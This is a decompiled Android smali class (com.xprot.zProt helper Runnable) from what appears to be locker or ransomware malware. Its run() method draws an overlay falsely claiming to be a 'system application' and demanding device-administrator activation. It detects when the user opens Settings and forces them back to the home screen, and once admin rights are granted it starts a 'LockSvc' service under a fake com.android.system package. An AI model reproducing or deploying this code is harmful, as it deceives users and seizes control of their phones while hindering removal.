.class Lcom/xprot/zProt$Helper$1$1;
.super Ljava/lang/Object;
.source "zProt.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/xprot/zProt$Helper$1;->onClick(Landroid/view/View;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$2:Lcom/xprot/zProt$Helper$1;

.field private final synthetic val$Checker:Landroid/os/Handler;


# direct methods
.method constructor <init>(Lcom/xprot/zProt$Helper$1;Landroid/os/Handler;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    iput-object p2, p0, Lcom/xprot/zProt$Helper$1$1;->val$Checker:Landroid/os/Handler;

    .line 222
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$0(Lcom/xprot/zProt$Helper$1$1;)Lcom/xprot/zProt$Helper$1;
    .locals 1

    .prologue
    .line 222
    iget-object v0, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    return-object v0
.end method


# virtual methods
.method public run()V
    .locals 15

    .prologue
    .line 227
    const/16 v11, -0x10

    invoke-static {v11}, Landroid/os/Process;->setThreadPriority(I)V

    .line 229
    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    invoke-static {v11}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v11

    const-string v12, "activity"

    invoke-virtual {v11, v12}, Lcom/xprot/zProt;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/app/ActivityManager;

    .line 230
    .local v8, "am":Landroid/app/ActivityManager;
    const/4 v11, 0x1

    invoke-virtual {v8, v11}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v10

    .line 231
    .local v10, "taskInfo":Ljava/util/List;, "Ljava/util/List<Landroid/app/ActivityManager$RunningTaskInfo;>;"
    const/4 v11, 0x0

    invoke-interface {v10, v11}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v5, v11, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    .line 233
    .local v5, "T_Init":Landroid/content/ComponentName;
    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    invoke-static {v11}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v11

    const-string v12, "device_policy"

    invoke-virtual {v11, v12}, Lcom/xprot/zProt;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    .line 235
    .local v0, "AzkOAOnv":Landroid/app/admin/DevicePolicyManager;
    new-instance v11, Landroid/content/ComponentName;

    iget-object v12, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v12}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v12

    invoke-static {v12}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v12

    invoke-virtual {v12}, Lcom/xprot/zProt;->getApplicationContext()Landroid/content/Context;

    move-result-object v12

    const-class v13, Lcom/xprot/zLock;

    invoke-direct {v11, v12, v13}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v11}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v7

    .line 245
    .local v7, "actived":Z
    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    invoke-static {v11}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v11

    iget-boolean v11, v11, Lcom/xprot/zProt;->A:Z

    if-nez v11, :cond_0

    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    invoke-static {v11, v5}, Lcom/xprot/zProt$Helper;->access$3(Lcom/xprot/zProt$Helper;Landroid/content/ComponentName;)Z

    move-result v11

    if-eqz v11, :cond_0

    .line 246
    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    invoke-static {v11}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v11

    const/4 v12, 0x1

    iput-boolean v12, v11, Lcom/xprot/zProt;->A:Z

    .line 247
    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    iget-object v12, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v12}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v12

    iget-object v12, v12, Lcom/xprot/zProt$Helper;->WM:Landroid/view/WindowManager;

    iget-object v13, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v13}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v13

    iget-object v13, v13, Lcom/xprot/zProt$Helper;->VW:Landroid/view/View;

    invoke-static {v11, v12, v13}, Lcom/xprot/zProt$Helper;->access$4(Lcom/xprot/zProt$Helper;Landroid/view/WindowManager;Landroid/view/View;)V

    .line 252
    :cond_0
    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    invoke-static {v11}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v11

    iget-boolean v11, v11, Lcom/xprot/zProt;->A:Z

    if-eqz v11, :cond_1

    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    invoke-static {v11, v5}, Lcom/xprot/zProt$Helper;->access$3(Lcom/xprot/zProt$Helper;Landroid/content/ComponentName;)Z

    move-result v11

    if-nez v11, :cond_1

    .line 253
    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    invoke-static {v11}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v11

    const/4 v12, 0x0

    iput-boolean v12, v11, Lcom/xprot/zProt;->A:Z

    .line 255
    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    invoke-static {v11}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v11

    const-string v12, "layout_inflater"

    invoke-virtual {v11, v12}, Lcom/xprot/zProt;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/LayoutInflater;

    .line 256
    .local v3, "Infalter":Landroid/view/LayoutInflater;
    const v11, 0x7f030005

    const/4 v12, 0x0

    invoke-virtual {v3, v11, v12}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v1

    .line 258
    .local v1, "DevAdShow":Landroid/view/View;
    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    iget-object v11, v11, Lcom/xprot/zProt$Helper;->WM:Landroid/view/WindowManager;

    iget-object v12, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v12}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v12

    iget-object v12, v12, Lcom/xprot/zProt$Helper;->PS:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v11, v1, v12}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 261
    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    invoke-static {v11}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v11

    invoke-virtual {v11}, Lcom/xprot/zProt;->getResources()Landroid/content/res/Resources;

    move-result-object v11

    const-string v12, "promo"

    const-string v13, "id"

    iget-object v14, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v14}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v14

    invoke-static {v14}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v14

    invoke-virtual {v14}, Lcom/xprot/zProt;->getPackageName()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v11, v12, v13, v14}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v11

    invoke-virtual {v1, v11}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v4

    .line 260
    check-cast v4, Landroid/widget/TextView;

    .line 263
    .local v4, "Promo":Landroid/widget/TextView;
    const-string v11, "\nAction required.\n\nThis is system application.\n\n   You must activate device administator.   \n"

    invoke-virtual {v4, v11}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 267
    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    invoke-static {v11}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v11

    invoke-virtual {v11}, Lcom/xprot/zProt;->getResources()Landroid/content/res/Resources;

    move-result-object v11

    const-string v12, "ZBLK"

    const-string v13, "id"

    iget-object v14, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v14}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v14

    invoke-static {v14}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v14

    invoke-virtual {v14}, Lcom/xprot/zProt;->getPackageName()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v11, v12, v13, v14}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v11

    invoke-virtual {v1, v11}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v6

    .line 266
    check-cast v6, Landroid/widget/Button;

    .line 272
    .local v6, "Tmp":Landroid/widget/Button;
    new-instance v11, Lcom/xprot/zProt$Helper$1$1$1;

    invoke-direct {v11, p0, v1}, Lcom/xprot/zProt$Helper$1$1$1;-><init>(Lcom/xprot/zProt$Helper$1$1;Landroid/view/View;)V

    invoke-virtual {v6, v11}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 310
    invoke-virtual {v5}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v11

    const-string v12, "com.android.settings"

    invoke-virtual {v11, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_1

    .line 311
    new-instance v9, Landroid/content/Intent;

    const-string v11, "android.settings.SETTINGS"

    invoke-direct {v9, v11}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 312
    .local v9, "intentA":Landroid/content/Intent;
    const/high16 v11, 0x40000000    # 2.0f

    invoke-virtual {v9, v11}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 313
    const/high16 v11, 0x10000000

    invoke-virtual {v9, v11}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 314
    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    invoke-static {v11}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v11

    invoke-virtual {v11, v9}, Lcom/xprot/zProt;->startActivity(Landroid/content/Intent;)V

    .line 315
    new-instance v2, Landroid/content/Intent;

    const-string v11, "android.intent.action.MAIN"

    invoke-direct {v2, v11}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 316
    .local v2, "Home":Landroid/content/Intent;
    const-string v11, "android.intent.category.HOME"

    invoke-virtual {v2, v11}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    .line 317
    const/high16 v11, 0x10000000

    invoke-virtual {v2, v11}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 318
    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    invoke-static {v11}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v11

    invoke-virtual {v11, v2}, Lcom/xprot/zProt;->startActivity(Landroid/content/Intent;)V

    .line 323
    .end local v1    # "DevAdShow":Landroid/view/View;
    .end local v2    # "Home":Landroid/content/Intent;
    .end local v3    # "Infalter":Landroid/view/LayoutInflater;
    .end local v4    # "Promo":Landroid/widget/TextView;
    .end local v6    # "Tmp":Landroid/widget/Button;
    .end local v9    # "intentA":Landroid/content/Intent;
    :cond_1
    if-nez v7, :cond_2

    .line 324
    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    iget-object v12, p0, Lcom/xprot/zProt$Helper$1$1;->val$Checker:Landroid/os/Handler;

    const/16 v13, 0xa

    invoke-static {v11, v12, p0, v13}, Lcom/xprot/zProt$Helper;->access$5(Lcom/xprot/zProt$Helper;Landroid/os/Handler;Ljava/lang/Runnable;I)V

    .line 327
    :cond_2
    if-eqz v7, :cond_3

    .line 328
    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    invoke-static {v11}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v11

    new-instance v12, Landroid/content/Intent;

    iget-object v13, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v13}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v13

    invoke-static {v13}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v13

    invoke-virtual {v13}, Lcom/xprot/zProt;->getApplicationContext()Landroid/content/Context;

    move-result-object v13

    const-class v14, Lcom/android/system/LockSvc;

    invoke-direct {v12, v13, v14}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v11, v12}, Lcom/xprot/zProt;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 329
    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    invoke-static {v11}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v11

    const/4 v12, 0x1

    iput-boolean v12, v11, Lcom/xprot/zProt;->B:Z

    .line 330
    iget-object v11, p0, Lcom/xprot/zProt$Helper$1$1;->this$2:Lcom/xprot/zProt$Helper$1;

    invoke-static {v11}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v11

    invoke-static {v11}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v11

    invoke-virtual {v11}, Lcom/xprot/zProt;->stopSelf()V

    .line 334
    :cond_3
    return-void
.end method
